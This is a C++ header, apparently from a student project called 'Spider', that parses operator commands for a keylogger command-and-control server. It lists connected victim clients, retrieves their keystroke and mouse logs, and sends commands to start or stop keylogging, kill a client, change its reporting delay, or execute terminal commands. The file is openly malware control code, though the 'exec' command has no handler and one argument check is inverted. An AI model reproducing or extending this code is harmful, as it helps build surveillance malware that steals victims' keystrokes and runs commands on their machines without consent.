//
// Created by aguado_e on 14/11/16.
//

#ifndef COMMAND_HPP
#define COMMAND_HPP

#include <tuple>
#include <vector>
#include <sstream>
#include <iostream>
#include <iomanip>
#include "protobufMessages/SpiderEnvelop.pb.h"
#include "protobufMessages/SpiderCommands.pb.h"

namespace Spider {
  class Command {
  public:
    Command(std::string command)
    {
      this->_parse(command);
    }
    const SpiderEnveloppe &getPacket() const { return _packet; }
    bool isValid() const { return _isValid; }

  private:
    SpiderEnveloppe _packet;
    bool _isValid = true;

    const std::vector<std::tuple<std::string, std::string, std::string>> _serverCommands = {
      std::make_tuple("list-clients", "", "Get a list of all clients connected to the server."),
      std::make_tuple("get-keylog", "<clientUUID> [limit]", "Get log for a client. Default limit = 1000 entries"),
      std::make_tuple("get-mouselog", "<clientUUID> [limit]", "Get log for a client. Default limit = 1000 entries"),
      std::make_tuple("send", "<clientUUID> <method> [argument]", "Send a command to a client. Type \"commands\" for more precisions.")
    };

    const std::vector<std::tuple<std::string, std::string, std::string>> _clientCommand = {
      std::make_tuple("start", "", "Start the keylogger if it's idle"),
      std::make_tuple("stop", "", "Pause the keylogger"),
      std::make_tuple("kill", "", "Stop and disconnect the client"),
      std::make_tuple("exec", "<command>", "Execute the given command in a terminal"),
      std::make_tuple("status", "", "Client activity status"),
      std::make_tuple("delay", "<integer>", "Set the frequency")
    };

    void cmdhHelp(bool verbose = false)
    {
      if (!verbose)
      {
        std::cout << "Invalid command. Type \"commands\" for more details" << std::endl;
        return;
      }

      std::cout << "USAGE:\n\n\tsend <client UUID> <command> [arguments]\n" << std::endl;
      std::cout << "COMMANDS:\n" << std::endl;
      for (auto it = _clientCommand.begin(); it != _clientCommand.end(); ++it)
      {
        std::cout << '\t' << std::left << std::setw(10) << std::get<0>(*it);
        std::cout << '\t' << std::left << std::setw(15) << std::get<1>(*it);
        std::cout << "  " << std::get<2>(*it) << std::endl;
      }
    }

    void help(bool verbose = false)
    {
      this->_isValid = false;

      if (!verbose)
      {
        std::cout << "Invalid command. Type \"help\" for more details" << std::endl;
        return;
      }

      std::cout << "USAGE:\n\n\t<method> [arguments]\n" << std::endl;
      std::cout << "METHODS:\n" << std::endl;
      for (auto it = _serverCommands.begin(); it != _serverCommands.end(); ++it)
      {
        std::cout << '\t' << std::left << std::setw(15) << std::get<0>(*it);
        std::cout << '\t' << std::left << std::setw(15) << std::get<1>(*it);
        std::cout << "  " << std::get<2>(*it) << std::endl;
      }
    }

    void isListValid(std::vector<std::string> command)
    {
      if (command.size() != 1)
      {
        help();
        this->_isValid = false;
        return;
      }
      _packet.set_clientid("0000000000000000");
      _packet.set_payloadtype("ClientList");
      _packet.mutable_payload()->PackFrom(ClientList());
    }

    void isGetKeylogValid(std::vector<std::string> command)
    {
      if (command.size() > 3 || command.size() < 2)
      {
        help();
        this->_isValid = false;
        return;
      }

      _packet.set_clientid(command[1]);
      _packet.set_payloadtype("GetClientLog");
      GetClientLog log;
      if (command.size() >= 3)
        log.set_limit(std::stoi(command[2]));
      else
        log.set_limit(1000);
      _packet.mutable_payload()->PackFrom(log);
    }

      void isGetMouselogValid(std::vector<std::string> command)
      {
        if (command.size() > 3 || command.size() < 2)
        {
          help();
          this->_isValid = false;
          return;
        }

        _packet.set_clientid(command[1]);
        _packet.set_payloadtype("GetClientMouseLog");
          GetClientMouseLog log;
        if (command.size() >= 3)
          log.set_limit(std::stoi(command[2]));
        else
          log.set_limit(1000);
        _packet.mutable_payload()->PackFrom(log);
      }

    // Just check if the function is an existing one and if it contains the right arguments
    bool isSendCommandValid(std::vector<std::string> command)
    {
      if (command.size() < 3 || command.size() > 4)
        return false;

      for (auto it = _clientCommand.begin(); it != _clientCommand.end(); ++it)
      {
      // Does the command exist ?
        if (std::get<0>(*it) == command[2])
        {
          // Does it require an argument ?
          if (std::get<1>(*it) != "")
            return (command.size() == 3);
          else
            return true;
        }
      }
      return false;
    }

    void isSendValid(std::vector<std::string> command)
    {
      if (!isSendCommandValid(command))
      {
        cmdhHelp();
        this->_isValid = false;
        return;
      }
      _packet.set_clientid(command[1]);

      // That's daaaaarty honey, stap it !
      if (command[2] == "start")
      {
        _packet.set_payloadtype("StartKeylogging");
        StartKeylogging log;
        _packet.mutable_payload()->PackFrom(log);
      }
      else if (command[2] == "stop")
      {
        _packet.set_payloadtype("StopKeylogging");
        StopKeylogging log;
        _packet.mutable_payload()->PackFrom(log);
      }
      else if (command[2] == "kill")
      {
        _packet.set_payloadtype("KillClient");
        KillClient log;
        _packet.mutable_payload()->PackFrom(log);
      }
      else if (command[2] == "status")
      {
        _packet.set_payloadtype("ClientStatus");
        ClientStatus log;
        _packet.mutable_payload()->PackFrom(log);
      }
      else if (command[2] == "delay")
      {
        _packet.set_payloadtype("SetClientDelay");
        SetClientDelay log;
        log.set_delay(std::atoi(command[3].c_str()));
        _packet.mutable_payload()->PackFrom(log);
      }
    }

    void _parse(std::string initialCommand)
    {
      std::vector<std::string> splittedCommands;
      std::stringstream ss(initialCommand);
      std::string temp;
      while (ss >> temp)
        splittedCommands.push_back(temp);

      if (splittedCommands.size() == 0)
        help();
      else if (splittedCommands[0] == "list-clients")
        isListValid(splittedCommands);
      else if (splittedCommands[0] == "get-keylog")
        isGetKeylogValid(splittedCommands);
      else if (splittedCommands[0] == "get-mouselog")
          isGetMouselogValid(splittedCommands);
      else if (splittedCommands[0] == "send")
        isSendValid(splittedCommands);
      else if (splittedCommands[0] == "commands")
        cmdhHelp(true);
      else if (splittedCommands[0] == "help")
        help(true);
      else
        help();
    }
  };
}


#endif //COMMAND_HPP
